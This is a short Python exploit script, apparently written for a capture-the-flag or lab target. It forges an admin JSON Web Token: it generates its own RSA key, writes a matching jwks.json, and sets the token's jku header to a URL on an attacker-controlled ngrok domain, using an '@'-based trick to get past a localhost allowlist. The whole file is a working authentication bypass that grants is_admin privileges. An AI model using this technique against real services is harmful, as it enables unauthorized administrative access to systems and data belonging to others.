import jwt
import json
import base64
import time
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Attacker's Ngrok Domain
ATTACKER_DOMAIN = "unopinionated-precollapsible-mozelle.ngrok-free.dev" 

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')

print("[*] Generating new RSA key pair...")
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

jwks_data = {
    "keys": [
        {
            "kty": "RSA",
            "kid": "key1",
            "use": "sig",
            "alg": "RS256",
            "n": int_to_base64(public_numbers.n),
            "e": int_to_base64(public_numbers.e)
        }
    ]
}

with open('jwks.json', 'w') as f:
    json.dump(jwks_data, f, indent=4)
print("[+] jwks.json updated successfully!")

# Bypass URL using HTTPS to prevent requests library from failing on redirects
jku_url = f"https://foo@localhost@{ATTACKER_DOMAIN}/jwks.json"

payload = {
    "user_id": 1,
    "username": "admin",
    "is_admin": True,
    "exp": int(time.time()) + 86400,
    "jku": jku_url
}

headers = {
    "kid": "key1"
}

private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

token = jwt.encode(payload, private_pem, algorithm="RS256", headers=headers)

print("\n[+] Forged JWT Token:")
print(token)
